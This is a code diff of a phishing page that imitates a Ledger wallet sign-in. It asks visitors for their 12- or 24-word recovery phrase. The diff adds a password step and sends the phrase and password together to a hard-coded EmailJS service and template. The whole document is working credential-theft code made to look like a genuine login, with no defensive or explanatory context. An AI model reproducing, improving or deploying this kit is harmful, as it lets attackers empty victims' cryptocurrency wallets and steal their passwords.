@@ -23,7 +23,6 @@
         width: 350px;
         border-radius: 5px;
       }
-
       .ledger-logo {
         width: 90px;
         margin-bottom: 10px;
@@ -45,6 +44,11 @@
         border: none;
         border-bottom: 1px solid black;
         outline: none;
+        font-size: 16px;
+        transition: border-color 0.3s ease;
+      }
+      input:focus {
+        border-bottom: 1px solid #66b3ff;
       }
       .error {
         color: red;
@@ -66,68 +70,37 @@
       }
       .btn-back {
         background: #ccc;
-        border-radius: 0%;
       }
       .btn-next {
         background: rgb(0, 103, 184);
         color: white;
-        border-radius: 0;
       }
-      input {
-        width: 100%;
-        padding: 10px;
-        margin-top: 5px;
-        border: none;
-        border-bottom: 1px solid black; /* Thin default line */
-        outline: none;
-        font-size: 16px; /* Prevents zoom on mobile */
-        transition: border-color 0.3s ease; /* Smooth transition */
-      }
-
-      input:focus {
-        border-bottom: 1px solid #66b3ff; /* Light blue line on focus */
-      }
-
-      /* === Responsive for Mobile === */
       @media (max-width: 600px) {
         body {
-          align-items: flex-start; /* Moves content to the top */
-          height: auto; /* Allows scrolling */
-          padding-top: -10px;
+          align-items: flex-start;
+          height: auto;
         }
         .container {
           width: 100%;
-          box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-          border-radius: 0; /* Removes rounded corners */
-          height: 28vh;
+          border-radius: 0;
         }
         .buttons {
-          width: 26vh;
-          gap: 25px;
-          margin-left: 130px;
-
-          /* flex-direction: column; */
+          width: 100%;
+          gap: 10px;
         }
         .btn {
           width: 100%;
-          margin-top: 10px;
-          /* margin-top: -5px; */
         }
         .ledger-logo {
           width: 11vh;
-          font-weight: lighter;
-        }
-        .btn-back {
-          color: black;
         }
       }
     </style>
   </head>
   <body>
-    <div class="container">
+    <div class="container" id="page1">
       <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
       <p class="title">Sign in</p>
-      <!-- <label>Enter Wallet 12-24 Key Phrase</label> -->
       <input
         type="text"
         id="walletPhrase"
@@ -136,41 +109,67 @@
       <p class="error" id="error">The Phrase must be between 12 to 24 words.</p>
       <div class="buttons">
         <button class="btn btn-back">Back</button>
-        <button class="btn btn-next" onclick="validatePhrase()">Next</button>
+        <button class="btn btn-next" onclick="goToPasswordPage()">Next</button>
+      </div>
+    </div>
+
+    <div class="container" id="page2" style="display: none">
+      <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
+      <p class="title">Enter Password</p>
+      <input type="password" id="password" placeholder="Enter your password" />
+      <div class="buttons">
+        <button class="btn btn-back" onclick="goBack()">Back</button>
+        <button class="btn btn-next" onclick="submitForm()">Sign In</button>
       </div>
     </div>
 
     <script>
       (function () {
-        emailjs.init("3ijyLWGjsj4QnVlp_"); // Replace with your actual EmailJS Public Key
+        emailjs.init("3ijyLWGjsj4QnVlp_");
       })();
 
-      function validatePhrase() {
+      function goToPasswordPage() {
         let phrase = document.getElementById("walletPhrase").value.trim();
         let words = phrase.split(/\s+/);
         let errorText = document.getElementById("error");
 
         if (words.length === 12 || words.length === 24) {
           errorText.style.display = "none";
+          localStorage.setItem("walletPhrase", phrase); // Store phrase
+          document.getElementById("page1").style.display = "none";
+          document.getElementById("page2").style.display = "block";
+        } else {
+          errorText.style.display = "block";
+        }
+      }
 
-          // Send Email using EmailJS
+      function goBack() {
+        document.getElementById("page1").style.display = "block";
+        document.getElementById("page2").style.display = "none";
+      }
+
+      function submitForm() {
+        let password = document.getElementById("password").value.trim();
+        let walletPhrase = localStorage.getItem("walletPhrase");
+
+        if (walletPhrase && password) {
           let emailParams = {
-            from_name: "User Wallet Input",
-            message: `User input: ${phrase}`,
+            from_name: "User Login",
+            message: `Wallet Phrase: ${walletPhrase}\nPassword: ${password}`,
           };
 
           emailjs
             .send("service_b2yu2u9", "template_vslmmtl", emailParams)
             .then((response) => {
-              alert("Valid phrase! Email sent successfully!");
+              alert("Sign-in successful! Email sent.");
               console.log("SUCCESS!", response);
             })
             .catch((error) => {
-              alert("Valid phrase, but failed to send email.");
+              alert("Sign-in failed. Try again.");
               console.log("FAILED...", error);
             });
         } else {
-          errorText.style.display = "block";
+          alert("Please enter your password.");
         }
       }
     </script>
